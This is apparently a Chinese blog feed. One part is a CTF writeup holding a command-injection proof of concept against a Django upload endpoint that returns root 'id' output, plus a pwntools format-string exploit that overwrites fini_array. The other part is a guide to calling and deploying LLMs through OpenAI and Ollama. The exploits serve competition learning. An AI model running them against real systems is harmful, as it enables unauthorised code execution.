class="string">&quot;default.png&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&#x27;图片名称不能为default.png，请修改&#x27;</span>&#125;)</span><br><span class="line">        file = request.FILES.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        save_path = os.path.join(settings.MEDIA_ROOT, <span class="string">&#x27;icon&#x27;</span>, name)</span><br><span class="line">        ins = models.WebSite.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="built_in">id</span>).first()</span><br><span class="line">        <span class="keyword">if</span> ins:</span><br><span class="line">            ins.icon = name</span><br><span class="line">            ins.save()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">for</span> chunk <span class="keyword">in</span> file.chunks():</span><br><span class="line">                        f.write(chunk)</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换成功&quot;</span>, <span class="string">&quot;detail&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换失败&quot;</span>, <span class="string">&quot;detail&quot;</span>: e&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">404</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>重启服务之后再次访问接口，测试一下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">login_url = <span class="string">&quot;http://localhost:8002/api/login/&quot;</span></span><br><span class="line">vuln_url = <span class="string">&quot;http://localhost:8002/api/icon/&quot;</span></span><br><span class="line"></span><br><span class="line">login_form = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin@1234&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">datas = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;1&quot;</span>),</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;id&quot;</span>),</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (<span class="string">&quot;a.png&quot;</span>, <span class="string">b&quot;aaa&quot;</span>, <span class="string">&#x27;image/png&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line">res = s.post(login_url, data=login_form).json()</span><br><span class="line">auth_token = res[<span class="string">&quot;detail&quot;</span>][<span class="string">&quot;token&quot;</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: auth_token</span><br><span class="line">&#125;</span><br><span class="line">res2 = s.post(vuln_url, files=datas, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(res2.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;execute success&quot;, &quot;detail&quot;: &quot;uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n&quot;&#125;</span></span><br></pre></td></tr></table></figure>


<h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><h4 id="soeasy"><a href="#soeasy" class="headerlink" title="soeasy"></a>soeasy</h4><ol>
<li>登录的密码是多少，请输入 md5 加密的 32 位小写字符串</li>
</ol>
<p>这是一个 FTP 流量包，筛选 ftp 流量，直接就能看到登录成功时所使用的的密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916103735687.png" alt="image-20230916103735687"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -n test | md5sum -t -</span><br><span class="line">098f6bcd4621d373cade4e832627b4f6  -</span><br></pre></td></tr></table></figure>

<blockquote>
<p>小坑: 直接用命令算 md5 时注意换行符</p>
</blockquote>
<ol start="2">
<li>被加密的字符串是多少</li>
</ol>
<p>从流量包中可以提取出以下文件:</p>
<ul>
<li><code>private_key.pem</code>、<code>public_key.pem</code>、<code>py.txt</code>、<code>encrypted.txt</code></li>
<li>即：私钥、公钥、加密用的 python 脚本、加密后的数据</li>
</ul>
<p>对照加密脚本写个解密脚本就行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">message, public_key_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(public_key_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        public_key = RSA.import_key(f.read())</span><br><span class="line">        cipher = PKCS1_OAEP.new(public_key)</span><br><span class="line">        encrypted_message = cipher.encrypt(message.encode())</span><br><span class="line">        <span class="keyword">return</span> encrypted_message</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">message, private_key_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(private_key_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        key_data = RSA.importKey(f.read())</span><br><span class="line">        private_key = PKCS1_OAEP.new(key_data)</span><br><span class="line">        decrypted_data = private_key.decrypt(message)</span><br><span class="line">        <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;encrypted.txt.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        data = decrypt_message(data, <span class="string">&quot;./private_key.pem&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>

<p>执行脚本得到加密的数据：<code>8dhn3edfna93rAPN</code></p>
<ol start="3">
<li>图片中隐藏的数字是多少 【这题没整出来】</li>
</ol>
<p>FTP 传输流量中有一个 11.zip，其中包含有一个 11.bmp 图片，打开是这样：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916110113730.png" alt="非原图"></p>
<p>根据图片大小 ( <code>biSizeImage</code>: <code>8957952</code> )、图片宽度 ( <code>biWidth</code>: <code>2304</code> ) 和比特数 ( <code>biBitCount</code>: <code>16</code> ) 信息计算出高度为 <code>1944</code> 【 <code>8957952/2304/(16/8)</code> 】, 修改后得到:</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916110946541.png" alt="还是非原图"></p>
<p>然后就卡这了，提交了一顿没个对的，谁能告诉👴🏻这数字不是 <code>30104023010402</code> 还能是啥</p>
<h4 id="session、easy-shiro"><a href="#session、easy-shiro" class="headerlink" title="session、easy_shiro"></a>session、easy_shiro</h4><ul>
<li>队内 web👴🏻🚪 整的</li>
</ul>
<h3 id="人工智障"><a href="#人工智障" class="headerlink" title="人工智障"></a>人工智障</h3><ul>
<li>🤖没拉到本地，还得手搓</li>
<li>全是pwn入门题目，思路在各题目描述里也有，根据思路手搓就行</li>
</ul>
<h4 id="fmt3-x64"><a href="#fmt3-x64" class="headerlink" title="fmt3_x64"></a>fmt3_x64</h4><p>其中 <code>fmt3_x64</code> 的格式化字符串漏洞覆盖 fini_array 操作头一次用，记录一下这个:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./fmt3_x64&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;172.16.7.10&quot;</span>, <span class="number">11473</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./fmt3_x64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;your fmt &gt;&gt;&gt;\n&quot;</span>, flat([</span><br><span class="line">    <span class="string">b&quot;%01784d&quot;</span> <span class="comment"># 0x06f8 -&gt; 0x4006f8 -&gt; backdoor</span></span><br><span class="line">    <span class="string">b&quot;%8$hnAAAA&quot;</span>,</span><br><span class="line">    p64(<span class="number">0x006009b8</span>), <span class="comment"># fini_array addr</span></span><br><span class="line">    <span class="string">b&quot;\n&quot;</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>更多: <a href="https://wiki.mrskye.cn/Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/">fini_array 劫持</a></li>
</ul>
<h1 id="2023陇剑杯总决赛"><a href="#2023陇剑杯总决赛" class="headerlink" title="2023陇剑杯总决赛"></a>2023陇剑杯总决赛</h1><h2 id="被暴打的战况"><a href="#被暴打的战况" class="headerlink" title="被暴打的战况"></a>被暴打的战况</h2><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230918204745722.png" alt="image-20230918204745722"></p>
<ul>
<li>👴🏻🚪太菜了，被虐麻了，愣是一个都没 patch 成功</li>
<li>第二天体验极其煎熬，通防不好使了😅</li>
<li>战况: 总排名 60th.</li>
</ul>
<h2 id="总决赛-Writeup"><a href="#总决赛-Writeup" class="headerlink" title="总决赛 Writeup"></a>总决赛 Writeup</h2><blockquote>
<p>TODO: 等先忙活完最近的事情再来补吧</p>
</blockquote>
<h3 id="实景防御-1"><a href="#实景防御-1" class="headerlink" title="实景防御"></a>实景防御</h3><ul>
<li>原本想上来先 patch 一个好上分，然后再去 RHG 赛道启动一下🤖<ul>
<li>没想到直接 patch 了一天也没 patch 成功一个😅</li>
</ul>
</li>
</ul>
<p>TODO</p>
<h3 id="数据分析-1"><a href="#数据分析-1" class="headerlink" title="数据分析"></a>数据分析</h3><p>TODO</p>
<h3 id="人工智障-1"><a href="#人工智障-1" class="headerlink" title="人工智障"></a>人工智障</h3><p>TODO</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>LLM 使用</title>
    <url>/2025/02/10/llm/</url>
    <content><![CDATA[<h1 id="大型语言模型（LLM）使用"><a href="#大型语言模型（LLM）使用" class="headerlink" title="大型语言模型（LLM）使用"></a>大型语言模型（LLM）使用</h1><p>最近稍微折腾了一下 LLM，记录一下相关的一些内容📝：</p>
<h2 id="API-调用"><a href="#API-调用" class="headerlink" title="API 调用"></a>API 调用</h2><h3 id="OpenAI"><a href="#OpenAI" class="headerlink" title="OpenAI"></a>OpenAI</h3><p>需要花💰直接调用的 API 通常情况下采用的是这一种调用方式</p>
<blockquote>
<p>👴🚪 正在用的是 <a href="https://api.bltcy.ai/register?aff=KdKu">柏拉图AI</a>，价格可以接受，模型也多</p>
</blockquote>
<p>Python3 调用脚本示例（Chat）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chat_with_openai</span>(<span class="params"></span></span><br><span class="line"><span class="params">    prompt: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    model: <span class="built_in">str</span> = <span class="string">&quot;gpt-4o-mini&quot;</span>,</span></span><br><span class="line"><span class="params">    api_key: <span class="built_in">str</span> = <span class="string">&quot;api_key&quot;</span>,</span></span><br><span class="line"><span class="params">    base_url: <span class="built_in">str</span> = <span class="string">&quot;https://api.bltcy.ai/v1&quot;</span>,</span></span><br><span class="line"><span class="params">    system_message: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    max_tokens: <span class="built_in">int</span> = <span class="number">10240</span>,</span></span><br><span class="line"><span class="params">    temperature: <span class="built_in">float</span> = <span class="number">0.7</span>,</span></span><br><span class="line"><span class="params">    stream: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用 OpenAI 的 Chat API 进行对话生成。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        prompt (str): 用户输入的提示文本</span></span><br><span class="line"><span class="string">        model (str): 要调用的模型名称</span></span><br><span class="line"><span class="string">        api_key (str): 替换成自己的 API 的密钥</span></span><br><span class="line"><span class="string">        base_url (str): 使用第三方平台时替换成对应的 API URL (找对应的说明文档) </span></span><br><span class="line"><span class="string">        system_message (str): 可选的系统消息，用于设置对话的上下文或行为</span></span><br><span class="line"><span class="string">        max_tokens (int): 生成文本的最大长度，这里默认为 10240，单位是 token</span></span><br><span class="line"><span class="string">        temperature (float): 控制生成文本的随机性，这里默认为 0.7。该数值越大，生成的文本随机性越大</span></span><br><span class="line"><span class="string">        stream (bool): 是否启用流式输出，这里默认为 False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        str: 生成的文本内容。如果启用流式输出，返回生成器的内容。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化 OpenAI 客户端</span></span><br><span class="line">        client = OpenAI(api_key=api_key, base_url=base_url)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构建消息列表</span></span><br><span class="line">        messages = []</span><br><span class="line">        <span class="keyword">if</span> system_message:</span><br><span class="line">            messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: system_message&#125;)</span><br><span class="line">        messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用 OpenAI API</span></span><br><span class="line">        response = client.chat.completions.create(</span><br><span class="line">            model=model,</span><br><span class="line">            messages=messages,</span><br><span class="line">            max_tokens=max_tokens,</span><br><span class="line">            temperature=temperature,</span><br><span class="line">            stream=stream,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理流式输出</span></span><br><span class="line">        <span class="keyword">if</span> stream:</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">                <span class="keyword">for</span> chunk <span class="keyword">in</span> response:</span><br><span class="line">                    <span class="keyword">if</span> chunk.choices[<span class="number">0</span>].delta.content:</span><br><span class="line">                        <span class="keyword">yield</span> chunk.choices[<span class="number">0</span>].delta.content</span><br><span class="line">            <span class="keyword">return</span> generate()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> response.choices[<span class="number">0</span>].message.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 异常处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>更多详细的 API 调用说明可以前往  <span class="emoji" alias="package" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4e6.png?v8">&#x1f4e6;</span> <a href="https://github.com/openai/openai-python">openai-python</a> 仓库查看 <a href="https://github.com/openai/openai-python/blob/main/api.md">api.md</a></p>
<h3 id="Ollama"><a href="#Ollama" class="headerlink" title="Ollama"></a>Ollama</h3><p>如果服务器端是通过 Ollama 搭建的，那么需要下面的方式进行调用。（本地部署搭建 Ollama 的过程在后面进行介绍）</p>
<p>Python3 脚本示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ollama <span class="keyword">import</span> Client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对话</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chat_with_ollama</span>(<span class="params"></span></span><br><span class="line"><span class="params">    prompt: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    model: <span class="built_in">str</span> = <span class="string">&quot;deepseek-coder-v2:latest&quot;</span>,</span></span><br><span class="line"><span class="params">    host: <span class="built_in">str</span> = <span class="string">&quot;http://192.168.155.8:11434&quot;</span>,</span></span><br><span class="line"><span class="params">    system_message: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    max_tokens: <span class="built_in">int</span> = <span class="number">10240</span>,</span></span><br><span class="line"><span class="params">    temperature: <span class="built_in">float</span> = <span class="number">0.7</span>,</span></span><br><span class="line"><span class="params">    stream: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用 Ollama Client 进行对话生成。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        prompt (str): 用户输入的提示文本</span></span><br><span class="line"><span class="string">        model (str): 自行指定要使用的模型名称</span></span><br><span class="line"><span class="string">        host (str): Ollama 服务的主机地址，需要指定为对应的 Ollama 服务器地址</span></span><br><span class="line"><span class="string">        system_message (str): 可选的系统消息，用于设置对话的上下文或行为</span></span><br><span class="line"><span class="string">        max_tokens (int): 生成文本的最大长度，默认为 10240</span></span><br><span class="line"><span class="string">        temperature (float): 控制生成文本的随机性，默认为 0.7</span></span><br><span class="line"><span class="string">        stream (bool): 是否启用流式输出，默认为 False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        str: 生成的文本内容。如果启用流式输出，返回生成器的内容</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化 Ollama 客户端</span></span><br><span class="line">        client = Client(host=host)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构建消息列表</span></span><br><span class="line">        messages = []</span><br><span class="line">        <span class="keyword">if</span> system_message:</span><br><span class="line">            messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: system_message&#125;)</span><br><span class="line">        messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用 Ollama API</span></span><br><span class="line">        response = client.chat(</span><br><span class="line">            model=model,</span><br><span class="line">            messages=messages,</span><br><span class="line">            options=&#123;</span><br><span class="line">                <span class="string">&quot;num_ctx&quot;</span>: max_tokens,</span><br><span class="line">                <span class="string">&quot;temperature&quot;</span>: temperature,</span><br><span class="line">            &#125;,</span><br><span class="line">            stream=stream,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理流式输出</span></span><br><span class="line">        <span class="keyword">if</span> stream:</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">                <span class="keyword">for</span> chunk <span class="keyword">in</span> response:</span><br><span class="line">                    <span class="keyword">yield</span> chunk[<span class="string">&quot;message&quot;</span>][<span class="string">&quot;content&quot;</span>]</span><br><span class="line">            <span class="keyword">return</span> generate()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> response[<span class="string">&quot;message&quot;</span>][<span class="string">&quot;content&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 异常处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_with_ollama</span>(<span class="params"></span></span><br><span class="line"><span class="params">    prompt: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    model: <span class="built_in">str</span> = <span class="string">&quot;deepseek-coder-v2:latest&quot;</span>,</span></span><br><span class="line"><span class="params">    host: <span class="built_in">str</span> = <span class="string">&quot;http://192.168.155.8:11434&quot;</span>,</span></span><br><span class="line"><span class="params">    max_tokens: <span class="built_in">int</span> = <span class="number">10240</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用 Ollama Client 进行文本生成（非对话模式）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        prompt (str): 输入的提示文本。</span></span><br><span class="line"><span class="string">        model (str): 自行指定要使用的模型名称</span></span><br><span class="line"><span class="string">        host (str): Ollama 服务的主机地址，需要指定为对应的 Ollama 服务器地址</span></span><br><span class="line"><span class="string">        max_tokens (int): 生成文本的最大长度</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        str: 生成的文本内容</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    client = Client(host=host)</span><br><span class="line">    response = client.generate(</span><br><span class="line">        model=model,</span><br><span class="line">        prompt=prompt,  <span class="comment"># 直接使用 prompt 参数，而非 messages 列表</span></span><br><span class="line">        options=&#123;<span class="string">&quot;num_ctx&quot;</span>: max_tokens&#125;,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">&quot;response&quot;</span>]</span><br></pre></td></tr></table></figure>



<p>更多详细的 API 调用说明可以前往 <span class="emoji" alias="package" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4e6.png?v8">&#x1f4e6;</span> <a href="https://github.com/ollama/ollama-python">ollama-python</a> 仓库查看 <a href="https://github.com/ollama/ollama/blob/main/docs/api.md">api.md</a></p>
<h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><p>仅记录 Linux 下的 <a href="https://ollama.com/">Ollama</a> 部署流程：</p>
<div class="note info"><h4 id="🏝️-部署环境"><a href="#🏝️-部署环境" class="headerlink" title="🏝️ 部署环境"></a>🏝️ 部署环境</h4><ul>
<li>软件环境：<ul>
<li>操作系统：Ubuntu 22.04 LTS</li>
<li>显卡驱动：565.57.01</li>
<li>CUDA 版本：12.7</li>
</ul>
</li>
<li>硬件配置：<ul>
<li>Intel(R) Xeon(R) CPU E5-2690 v4 @ 2.60GHz</li>
<li>NVIDIA GeForce RTX 3080</li>
</ul>
</li>
</ul>
</div>

<h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>Linux 系统下直接执行下述命令安装 Ollama：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://ollama.com/install.sh | sh</span><br></pre></td></tr></table></figure>

<p>其他操作系统从官网直接下载安装包安装即可：<a href="https://ollama.com/download">https://ollama.com/download</a></p>
<h3 id="拉取模型"><a href="#拉取模型" class="headerlink" title="拉取模型"></a>拉取模型</h3><p>安装完毕后即可从 ollama.com 中搜索并拉取需要的模型，以 <a href="https://ollama.com/library/deepseek-r1"><code>deepseek-r1</code></a> 为例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取并加载运行 deepseek-r1:8b 模型</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ollama run deepseek-r1:8b</span></span><br><span class="line">pulling manifest</span><br><span class="line">pulling 6340dc3229b0... 100% ▕██████████████████████████████████████████████████████████████████▏ 4.9 GB</span><br><span class="line">pulling 369ca498f347... 100% ▕██████████████████████████████████████████████████████████████████▏  387 B</span><br><span class="line">pulling 6e4c38e1172f... 100% ▕██████████████████████████████████████████████████████████████████▏ 1.1 KB</span><br><span class="line">pulling f4d24e9138dd... 100% ▕██████████████████████████████████████████████████████████████████▏  148 B</span><br><span class="line">pulling 0cb05c6e4e02... 100% ▕██████████████████████████████████████████████████████████████████▏  487 B</span><br><span class="line">verifying sha256 digest</span><br><span class="line">writing manifest</span><br><span class="line">success</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; 你是谁？</span></span><br><span class="line">&lt;think&gt;</span><br><span class="line"></span><br><span class="line">&lt;/think&gt;</span><br><span class="line"></span><br><span class="line">您好！我是由中国的深度求索（DeepSeek）公司开发的智能助手DeepSeek-R1。如您有任何任何问题，我会尽我所能为您提供帮助。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Send a message (/? <span class="keyword">for</span> <span class="built_in">help</span>)</span></span><br></pre></td></tr></table></figure>

<p>通过 <code>ollama run</code> 命令运行的模型将在前台执行，执行 <code>/exit</code> 可以退出前台运行。</p>
<blockquote>
<p>至于大模型参数量的选择，可以参考 <a href="https://www.cnblogs.com/alex-oos/p/18695704">这篇博客</a> </p>
</blockquote>
<p>在模型拉取之后可以使用 <code>ollama list</code> 查看已存在的模型，并且可以通过 <code>11434</code> 端口对已存在的模型进行 API 调用（无需处于前台执行），调用方法已在前面介绍过。但默认情况下仅可通过本地访问 <code>11434</code> 端口，如果需要全局监听则需要更改 Ollama 服务配置，在 <code>[Service]</code>模块下增加 <code>Environment=&quot;OLLAMA_HOST=0.0.0.0&quot;</code>，保存后重载服务配置生效。</p>
<p>修改 <code>/etc/systemd/system/ollama.service</code> 配置文件：</p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Ollama Service</span><br><span class="line"><span class="attr">After</span>=network-<span class="literal">on</span>line.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line">...... 原来的内容保持不动，在下面添加即可</span><br><span class="line"><span class="attr">Environment</span>=<span class="string">&quot;OLLAMA_HOST=0.0.0.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=default.target</span><br></pre></td></tr></table></figure>

<p>重载服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart ollama</span><br></pre></td></tr></table></figure>



<h3 id="Web-UI-平台搭建"><a href="#Web-UI-平台搭建" class="headerlink" title="Web UI 平台搭建"></a>Web UI 平台搭建</h3><p>如果需要一个类似于 ChatGPT 那样的 Web 访问平台，可以搭建 <a href="https://github.com/open-webui/open-webui">Open WebUI</a> 、<a href="https://github.com/lobehub/lobe-chat">Lobe Chat</a>、<a href="https://github.com/Mintplex-Labs/anything-llm">AnyThing LLM</a> 等。以 Open WebUI 为例，在 Ollama 服务器上使用 Docker 搭建：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main</span><br></pre></td></tr></table></figure>

<p>具体选用的安装方式最好还是根据使用需求，参考各仓库的 README 文档进行部署。</p>
<h2 id="微调"><a href="#微调" class="headerlink" title="微调"></a>微调</h2><p>在一些研究或工作当中，现有的通用 LLM 可能在一些专用领域中表现欠佳，或者需要为模型提供一些专用的知识库，因此通常考虑对合适的模型进行微调，以实现专用知识问答等需求。</p>
<h3 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h3><p><a href="https://github.com/unslothai/unsloth">unsloth</a> 是一个专注于高效微调的框架，旨在帮助用户快速、低成本地对大语言模型进行定制化训练。它支持多种流行的开源模型，如 LLaMA3.2、Gemma2、Qwen2.5 等，并且针对这些模型进行了深度优化，显著减少了微调所需的时间和显存占用。通过 unsloth，用户可以在消费级 GPU 上完成微调任务，而无需依赖昂贵的硬件设备。</p>
<p>全部支持的模型可以从 <a href="https://huggingface.co/unsloth">HuggingFace</a> 中找到，各自都带有对应的 JupyterNotebook 代码，可以直接在 Colab 使用免费的 T4 进行测试。</p>
<blockquote>
<p>已测试 <a href="https://huggingface.co/unsloth/Qwen2.5-7B-Instruct">Qwen2.5-7B-Instruct</a> 可以在 GeForce RTX 3080 上进行微调</p>
</blockquote>
